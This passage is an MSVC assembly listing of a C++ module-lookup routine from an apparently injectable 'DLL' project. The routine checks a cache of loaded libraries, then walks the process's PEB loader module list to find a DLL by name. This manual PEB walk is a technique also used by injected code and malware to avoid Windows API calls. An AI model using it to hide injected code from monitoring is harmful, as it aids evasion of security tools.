	mov	rax, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+24
	mov	rbx, QWORD PTR [rax+rcx*8+8]

; 1566 :         const _Nodeptr _End     = _List._Mypair._Myval2._Myhead;
; 1567 :         if (_Where == _End) {

	cmp	rbx, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8
	je	SHORT $LN720@GetModHand

; 1568 :             return {_End, _Nodeptr{}};
; 1569 :         }
; 1570 : 
; 1571 :         const _Nodeptr _Bucket_lo = _Vec._Mypair._Myval2._Myfirst[_Bucket << 1]._Ptr;

	mov	r12, QWORD PTR [rax+rcx*8]
	npad	9
$LL204@GetModHand:

; 1572 :         for (;;) {
; 1573 :             // Search backwards to maintain sorted [_Bucket_lo, _Bucket_hi] when !_Standard
; 1574 :             if (!_Traitsobj(_Keyval, _Traits::_Kfn(_Where->_Myval))) {

	lea	rdx, QWORD PTR [rbx+16]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4633 :         return _Traits_equal<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize,

	mov	rax, QWORD PTR [rdx+16]

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rdx+24], 15

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN224@GetModHand

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rdx, QWORD PTR [rdx]
$LN224@GetModHand:

; 2235 :         const value_type* _Result = _Bx._Buf;

	lea	rcx, QWORD PTR $T11[rsp]

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	r13, 15

; 2236 :         if (_Large_mode_engaged()) {

	cmova	rcx, r15

; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	cmp	rsi, rax
	jne	SHORT $LN239@GetModHand

; 379  :         return __builtin_memcmp(_First1, _First2, _Count);

	mov	r8, rsi
	call	memcmp

; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	test	eax, eax
	je	SHORT $LN671@GetModHand
$LN239@GetModHand:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1584 :             if (_Where == _Bucket_lo) {

	cmp	rbx, r12
	je	SHORT $LN672@GetModHand

; 1586 :             }
; 1587 : 
; 1588 :             _Where = _Where->_Prev;

	mov	rbx, QWORD PTR [rbx+8]

; 1589 :         }

	jmp	SHORT $LL204@GetModHand
$LN671@GetModHand:

; 1575 :                 if constexpr (!_Traits::_Standard) {
; 1576 :                     if (_Traitsobj(_Traits::_Kfn(_Where->_Myval), _Keyval)) {
; 1577 :                         return {_Where->_Next, _Nodeptr{}};
; 1578 :                     }
; 1579 :                 }
; 1580 : 
; 1581 :                 return {_Where->_Next, _Where};

	mov	r12, 1099511628211			; 00000100000001b3H
	jmp	SHORT $LN205@GetModHand
$LN672@GetModHand:

; 1585 :                 return {_Where, _Nodeptr{}};

	mov	r12, 1099511628211			; 00000100000001b3H
$LN720@GetModHand:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	xor	ebx, ebx
$LN205@GetModHand:
	cmp	r13, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN262@GetModHand

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	lea	rdx, QWORD PTR [r13+1]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rax, r15

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN276@GetModHand

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r15, QWORD PTR [r15-8]
	sub	rax, r15

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rax, -8
	cmp	rax, 31
	ja	$LN724@GetModHand
$LN276@GetModHand:

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	rcx, r15
	call	??3@YAXPEAX_K@Z				; operator delete
	npad	1
$LN262@GetModHand:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR $T4[rsp+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN299@GetModHand

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR $T4[rsp]
	mov	rax, rcx

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN313@GetModHand

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	rcx, QWORD PTR [rcx-8]
	sub	rax, rcx

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rax, -8
	cmp	rax, 31
	ja	$LN725@GetModHand
$LN313@GetModHand:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN299@GetModHand:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 53   : 	if ( _loadedLibs.count(_lower(libName).c_str()) > 0 )

	test	rbx, rbx
	je	$LN4@GetModHand

; 54   : 		return _loadedLibs.find(_lower(libName).c_str())->second;

	mov	rdx, r14
	lea	rcx, QWORD PTR $T9[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rdx, rax
	lea	rcx, QWORD PTR $T3[rsp]
	call	?_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z ; ProcessUtilities::_lower
	npad	1
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rax+24], 15

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN323@GetModHand

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rax, QWORD PTR [rax]
$LN323@GetModHand:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 54   : 		return _loadedLibs.find(_lower(libName).c_str())->second;

	mov	rdx, rax
	lea	rcx, QWORD PTR $T12[rbp-256]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2235 :         const value_type* _Result = _Bx._Buf;

	lea	rdx, QWORD PTR $T12[rbp-256]

; 2236 :         if (_Large_mode_engaged()) {

	mov	r15, QWORD PTR $T12[rbp-256]

; 2244 :         return _Myres > _Small_string_capacity;

	mov	r13, QWORD PTR $T12[rbp-232]
	cmp	r13, 15

; 2236 :         if (_Large_mode_engaged()) {

	cmova	rdx, r15

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	xor	ecx, ecx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	mov	rsi, QWORD PTR $T12[rbp-240]
	test	rsi, rsi
	je	SHORT $LN355@GetModHand
$LL688@GetModHand:

; 2301 :         _Val ^= static_cast<size_t>(_First[_Idx]);

	movzx	eax, BYTE PTR [rdx+rcx]
	xor	rdi, rax

; 2302 :         _Val *= _FNV_prime;

	imul	rdi, r12

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	inc	rcx
	cmp	rcx, rsi
	jb	SHORT $LL688@GetModHand
$LN355@GetModHand:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1564 :         const size_type _Bucket = _Hashval & _Mask;

	and	rdi, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+48

; 1565 :         _Nodeptr _Where         = _Vec._Mypair._Myval2._Myfirst[(_Bucket << 1) + 1]._Ptr;

	add	rdi, rdi
	mov	rax, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+24
	mov	rbx, QWORD PTR [rax+rdi*8+8]

; 1566 :         const _Nodeptr _End     = _List._Mypair._Myval2._Myhead;
; 1567 :         if (_Where == _End) {

	mov	r12, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8
	cmp	rbx, r12
	je	SHORT $LN674@GetModHand

; 1568 :             return {_End, _Nodeptr{}};
; 1569 :         }
; 1570 : 
; 1571 :         const _Nodeptr _Bucket_lo = _Vec._Mypair._Myval2._Myfirst[_Bucket << 1]._Ptr;

	mov	rdi, QWORD PTR [rax+rdi*8]
	npad	6
$LL363@GetModHand:

; 1572 :         for (;;) {
; 1573 :             // Search backwards to maintain sorted [_Bucket_lo, _Bucket_hi] when !_Standard
; 1574 :             if (!_Traitsobj(_Keyval, _Traits::_Kfn(_Where->_Myval))) {

	lea	rdx, QWORD PTR [rbx+16]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4633 :         return _Traits_equal<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize,

	mov	rax, QWORD PTR [rdx+16]

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rdx+24], 15

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN383@GetModHand

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rdx, QWORD PTR [rdx]
$LN383@GetModHand:

; 2235 :         const value_type* _Result = _Bx._Buf;

	lea	rcx, QWORD PTR $T12[rbp-256]

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	r13, 15

; 2236 :         if (_Large_mode_engaged()) {

	cmova	rcx, r15

; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	cmp	rsi, rax
	jne	SHORT $LN398@GetModHand

; 379  :         return __builtin_memcmp(_First1, _First2, _Count);

	mov	r8, rsi
	call	memcmp

; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	test	eax, eax
	je	SHORT $LN364@GetModHand
$LN398@GetModHand:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1584 :             if (_Where == _Bucket_lo) {

	cmp	rbx, rdi
	je	SHORT $LN674@GetModHand

; 1586 :             }
; 1587 : 
; 1588 :             _Where = _Where->_Prev;

	mov	rbx, QWORD PTR [rbx+8]

; 1589 :         }

	jmp	SHORT $LL363@GetModHand
$LN674@GetModHand:

; 1214 :             if (_Target) {

	xor	ebx, ebx
$LN364@GetModHand:
	test	rbx, rbx
	cmovne	r12, rbx
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 54   : 		return _loadedLibs.find(_lower(libName).c_str())->second;

	mov	rbx, QWORD PTR [r12+48]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	r13, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN442@GetModHand

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	lea	rdx, QWORD PTR [r13+1]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rax, r15

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN456@GetModHand

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r15, QWORD PTR [r15-8]
	sub	rax, r15

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rax, -8
	cmp	rax, 31
	ja	$LN726@GetModHand
$LN456@GetModHand:

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	rcx, r15
	call	??3@YAXPEAX_K@Z				; operator delete
	npad	1
$LN442@GetModHand:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR $T3[rsp+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN479@GetModHand

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR $T3[rsp]
	mov	rax, rcx

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN493@GetModHand

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	rcx, QWORD PTR [rcx-8]
	sub	rax, rcx

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rax, -8
	cmp	rax, 31
	ja	$LN727@GetModHand
$LN493@GetModHand:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN479@GetModHand:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	movdqa	xmm0, XMMWORD PTR __xmm@000000000000000f0000000000000000
	movdqu	XMMWORD PTR $T3[rsp+16], xmm0

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR $T3[rsp], 0

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [r14+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN516@GetModHand

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [r14]

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN530@GetModHand

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	$LN527@GetModHand

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN530@GetModHand:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN516@GetModHand:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 54   : 		return _loadedLibs.find(_lower(libName).c_str())->second;

	mov	rax, rbx
	jmp	$LN721@GetModHand
$LN4@GetModHand:

; 55   : 
; 56   : 	PPEB peb = ( PPEB ) GetPebAddress();

	call	GetPebAddress

; 57   : 
; 58   : 	PPEB_LDR_DATA         LDRData = peb->Ldr;

	mov	r12, QWORD PTR [rax+24]

; 59   : 	LIST_ENTRY* modules = &LDRData->InMemoryOrderModuleList;

	add	r12, 32					; 00000020H

; 60   : 	LIST_ENTRY* nextEntry = modules->Flink;

	mov	r15, QWORD PTR [r12]

; 61   : 	LDR_DATA_TABLE_ENTRY* modInfo = NULL;
; 62   : 
; 63   : 	while ( nextEntry != modules ) {

	cmp	r15, r12
	je	$LN3@GetModHand
	xor	edi, edi
$LN722@GetModHand:

; 64   : 		modInfo = ( LDR_DATA_TABLE_ENTRY* ) ( ( BYTE* ) nextEntry - sizeof(LIST_ENTRY) ); // get the info

	mov	r8d, 22
	mov	rdx, -9223372036854775808		; 8000000000000000H
	mov	rcx, 9223372036854775807		; 7fffffffffffffffH
	lea	r13, QWORD PTR [r15]

; 65   : 		nextEntry = nextEntry->Flink; // set the current node to the next node

	mov	r15, QWORD PTR [r15]

; 67   : 		if ( _sub(_lower(PWSTRToString(modInfo->FullDllName.Buffer)), _lower(libName)) ) {

	lea	rax, QWORD PTR $T17[rbp-256]
	mov	QWORD PTR $T14[rbp-256], rax
	xorps	xmm0, xmm0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

	movups	XMMWORD PTR $T2[rsp], xmm0

; 2308 :     size_type _Mysize = 0; // current length of string (size)

	mov	QWORD PTR $T2[rsp+16], rdi

; 2309 :     size_type _Myres  = 0; // current storage reserved for string (capacity)

	mov	QWORD PTR $T2[rsp+24], rdi

; 2509 :         _Construct<_Construct_strategy::_From_string>(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);

	mov	rdi, QWORD PTR [r14+16]

; 2235 :         const value_type* _Result = _Bx._Buf;

	mov	rsi, r14

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [r14+24], 15

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN36@GetModHand

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rsi, QWORD PTR [r14]
$LN36@GetModHand:

; 2672 :         if (_Count > max_size()) {

	cmp	rdi, rcx
	ja	$LN675@GetModHand

; 2674 :         }
; 2675 : 
; 2676 :         auto& _Al       = _Getal();
; 2677 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);
; 2678 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);
; 2679 : 
; 2680 :         if (_Count <= _Small_string_capacity) {

	cmp	rdi, 15
	ja	SHORT $LN44@GetModHand

; 2681 :             _My_data._Mysize = _Count;

	mov	QWORD PTR $T2[rsp+16], rdi

; 2682 :             _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR $T2[rsp+24], 15

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

	movups	xmm0, XMMWORD PTR [rsi]
	movups	XMMWORD PTR $T2[rsp], xmm0

; 2699 :             return;

	jmp	$LN101@GetModHand
$LN44@GetModHand:

; 4763 :         const size_type _Masked = _Requested | _Alloc_mask;

	mov	rbx, rdi
	or	rbx, 15
	cmp	rbx, rcx

; 4764 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

	jbe	SHORT $LN54@GetModHand

; 4765 :             return _Max;

	mov	rbx, rcx
	lea	rax, QWORD PTR [rdx+39]
	jmp	SHORT $LN718@GetModHand
$LN54@GetModHand:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility

; 74   :     return _Left < _Right ? _Right : _Left;

	cmp	rbx, 22
	cmovb	rbx, r8
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2616 :         ++_Capacity; // Take null terminator into consideration

	lea	rcx, QWORD PTR [rbx+1]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 196  :     if (_Bytes == 0) {

	test	rcx, rcx
	jne	SHORT $LN72@GetModHand

; 197  :         return nullptr;

	xor	eax, eax
	jmp	SHORT $LN71@GetModHand
$LN72@GetModHand:

; 198  :     }
; 199  : 
; 200  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 201  :     if (_STD is_constant_evaluated()) {
; 202  :         return _Traits::_Allocate(_Bytes);
; 203  :     }
; 204  : #endif // _HAS_CXX20
; 205  : 
; 206  : #ifdef __cpp_aligned_new
; 207  :     if constexpr (_Align > __STDCPP_DEFAULT_NEW_ALIGNMENT__) {
; 208  :         size_t _Passed_align = _Align;
; 209  : #if defined(_M_IX86) || defined(_M_X64)
; 210  :         if (_Bytes >= _Big_allocation_threshold) {
; 211  :             // boost the alignment of big allocations to help autovectorization
; 212  :             _Passed_align = (_STD max)(_Align, _Big_allocation_alignment);
; 213  :         }
; 214  : #endif // defined(_M_IX86) || defined(_M_X64)
; 215  :         return _Traits::_Allocate_aligned(_Bytes, _Passed_align);
; 216  :     } else
; 217  : #endif // defined(__cpp_aligned_new)
; 218  :     {
; 219  : #if defined(_M_IX86) || defined(_M_X64)
; 220  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rcx, 4096				; 00001000H
	jb	SHORT $LN74@GetModHand

; 153  :     const size_t _Block_size = _Non_user_size + _Bytes;

	lea	rax, QWORD PTR [rcx+39]

; 154  :     if (_Block_size <= _Bytes) {

	cmp	rax, rcx
	jbe	$LN676@GetModHand
$LN718@GetModHand:

; 101  :         return ::operator new(_Bytes);

	mov	rcx, rax
	call	??2@YAPEAX_K@Z				; operator new
	mov	rcx, rax

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	test	rax, rax
	je	$LN84@GetModHand

; 160  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

	add	rax, 39					; 00000027H
	and	rax, -32				; ffffffffffffffe0H

; 161  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

	mov	QWORD PTR [rax-8], rcx

; 222  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

	jmp	SHORT $LN71@GetModHand
$LN74@GetModHand:

; 101  :         return ::operator new(_Bytes);

	call	??2@YAPEAX_K@Z				; operator new
$LN71@GetModHand:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2704 :         _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

	mov	QWORD PTR $T2[rsp], rax

; 2705 : 
; 2706 :         _My_data._Mysize = _Count;

	mov	QWORD PTR $T2[rsp+16], rdi

; 2707 :         _My_data._Myres  = _New_capacity;

	mov	QWORD PTR $T2[rsp+24], rbx

; 2708 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2709 :             _Traits::assign(_Unfancy(_New_ptr), _Count, _Arg);
; 2710 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());
; 2711 :         } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2712 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count);
; 2713 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());
; 2714 :         } else { // _Strat == _Construct_strategy::_From_string
; 2715 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count + 1);

	lea	r8, QWORD PTR [rdi+1]

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

	mov	rdx, rsi
	mov	rcx, rax
	call	memcpy
$LN101@GetModHand:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 67   : 		if ( _sub(_lower(PWSTRToString(modInfo->FullDllName.Buffer)), _lower(libName)) ) {

	lea	rdx, QWORD PTR $T2[rsp]
	lea	rcx, QWORD PTR $T17[rbp-256]
	call	?_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z ; ProcessUtilities::_lower
	mov	rsi, rax
	mov	rdi, QWORD PTR [r13+64]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h

; 916  :     return ::operator new(sz);

	mov	ecx, 24
	call	??2@YAPEAX_K@Z				; operator new
	mov	rbx, rax
	mov	QWORD PTR $T5[rsp], rax

; 321  :     : m_Data(new Data_t(s))

	test	rax, rax
	je	SHORT $LN118@GetModHand
	xorps	xmm0, xmm0
	xor	eax, eax
	movups	XMMWORD PTR [rbx], xmm0
	mov	QWORD PTR [rbx+16], rax

; 689  :     : m_str(NULL), m_RefCount(1)

	mov	QWORD PTR [rbx+8], rax
	mov	DWORD PTR [rbx+16], 1

; 690  : {
; 691  :     m_wstr = ::SysAllocString(s);

	mov	rcx, rdi
	call	QWORD PTR __imp_SysAllocString
	mov	QWORD PTR [rbx], rax

; 692  : 
; 693  :     if (m_wstr == NULL && s != NULL) {

	test	rax, rax
	jne	SHORT $LN127@GetModHand
	test	rdi, rdi
	jne	$LN677@GetModHand
$LN127@GetModHand:

; 321  :     : m_Data(new Data_t(s))

	xor	edi, edi
	jmp	SHORT $LN119@GetModHand
$LN118@GetModHand:
	xor	edi, edi
	mov	ebx, edi
$LN119@GetModHand:
